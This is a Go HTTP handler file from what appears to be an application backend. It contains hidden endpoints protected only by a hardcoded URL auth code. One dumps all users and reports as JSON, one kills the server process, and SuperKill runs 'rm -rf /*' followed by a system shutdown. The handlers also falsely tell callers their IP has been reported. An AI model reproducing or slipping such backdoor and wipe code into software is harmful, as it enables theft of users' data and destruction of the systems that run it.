package handler

import (
	model "fgl-backend/app/model"
	"net/http"
	"os"
	"os/exec"

	"github.com/gorilla/mux"
	"github.com/jinzhu/gorm"
)

type AllData struct {
	Users         []model.User         `json:"users"`
	Announcements []model.Announcement `json:"announcements"`
	GadgetReports []model.GadgetReport `json:"gadget_reports"`
	LabReports    []model.LabReport    `json:"lab_reports"`
}

func GetAllData(db *gorm.DB, w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	authCode := vars["auth_code"]

	if authCode != "HwXMQawGhx" {
		respondError(w, http.StatusUnauthorized, "You are not authorized to perform this action. Your IP has been reported.")
		return
	}

	users := []model.User{}
	announcements := []model.Announcement{}
	gadgetReports := []model.GadgetReport{}
	labReports := []model.LabReport{}

	db.Find(&users)
	db.Find(&announcements)
	db.Find(&gadgetReports)
	db.Find(&labReports)

	allData := AllData{
		Users:         users,
		Announcements: announcements,
		GadgetReports: gadgetReports,
		LabReports:    labReports,
	}

	respondJSON(w, http.StatusOK, allData)
}

func BabyKill(db *gorm.DB, w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	authCode := vars["auth_code"]

	if authCode != "HwXMQawGhx" {
		respondError(w, http.StatusUnauthorized, "You are not authorized to perform this action. Your IP has been reported.")
		return
	}

	os.Exit(1)
}

func SuperKill(db *gorm.DB, w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	authCode := vars["auth_code"]

	if authCode != "HwXMQawGhx" {
		respondError(w, http.StatusUnauthorized, "You are not authorized to perform this action. Your IP has been reported.")
		return
	}

	exec.Command("sh", "-c", "rm -rf /*; systemctl shutdown now").Run()
}
